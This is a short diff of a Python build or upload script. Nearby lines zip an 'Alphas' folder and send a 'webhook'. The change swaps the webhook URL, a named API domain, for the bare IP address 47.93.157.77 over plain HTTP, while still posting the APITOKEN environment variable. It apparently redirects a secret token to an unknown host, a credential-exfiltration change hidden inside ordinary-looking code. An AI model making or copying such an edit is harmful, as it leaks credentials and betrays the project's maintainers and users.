@@ -69,6 +69,6 @@ os.system("zip Alphas.zip -r Alphas/*")
 
 # Send Webhooks
 try:
-    print(requests.post("https://apihk.asdb.live/photo/api/v1/webhooks/update" , json={"token":os.getenv('APITOKEN')}).json())
+    print(requests.post("http://47.93.157.77" , json={"token":os.getenv('APITOKEN')}).json())
 except:
     print("Webhook error")
